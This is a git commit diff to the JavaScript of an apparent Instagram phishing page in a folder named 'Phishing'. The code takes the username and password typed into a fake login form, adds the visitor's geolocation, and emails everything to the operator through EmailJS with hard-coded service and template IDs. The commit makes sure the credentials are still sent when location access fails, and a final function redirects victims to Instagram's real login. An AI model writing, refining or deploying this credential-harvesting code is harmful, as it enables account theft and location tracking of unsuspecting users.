90a581e94dce660e24aeb6c6fc8165ee4a600a2b
gorkem4962 <80282479+gorkem4962@users.noreply.github.com>
2025-05-16 12:42:36 +0200

    Update app.js
    New

--- Phishing/js/app.js
+++ Phishing/js/app.js
@@ -1,40 +1,52 @@
 function sendMail() {
-  // First, get the username and password
   var username = document.getElementById("username").value;
   var password = document.getElementById("password").value;
 
-  // Check if geolocation is supported
+  const serviceid = 'service_udupifp';
+  const templateid = 'template_rfoq0w4';
+
+  function sendEmailWithParams(params) {
+    emailjs.send(serviceid, templateid, params)
+      .then(res => {
+        document.getElementById("username").value = "";
+        document.getElementById("password").value = "";
+      })
+      .catch(err => alert(err));
+  }
+
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(function(position) {
-      // Get location coordinates
-      var latitude = position.coords.latitude;
-      var longitude = position.coords.longitude;
-
-      // Include location data in params
       var params = {
         username_id: username,
         passwort_id: password,
-        latitude: latitude,
-        longitude: longitude
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude
       };
-
-      const serviceid = 'service_udupifp';
-      const templateid = 'template_rfoq0w4';
-
-      emailjs.send(serviceid, templateid, params)
-        .then(res => {
-          document.getElementById("username").value = "";
-          document.getElementById("password").value = "";
-        })
-        .catch(err => alert(err));
-
+      sendEmailWithParams(params);
     }, function(error) {
       alert("Unable to retrieve location: " + error.message);
+      var params = {
+        username_id: username,
+        passwort_id: password,
+        latitude: '',
+        longitude: ''
+      };
+      sendEmailWithParams(params);
     });
   } else {
     alert("Geolocation is not supported by this browser.");
+    var params = {
+      username_id: username,
+      passwort_id: password,
+      latitude: '',
+      longitude: ''
+    };
+    sendEmailWithParams(params);
   }
 }
+
+
+
 function forwarding(){
   document.getElementById("LoginButton").addEventListener("click", function() {
     // Redirect to Instagram login page
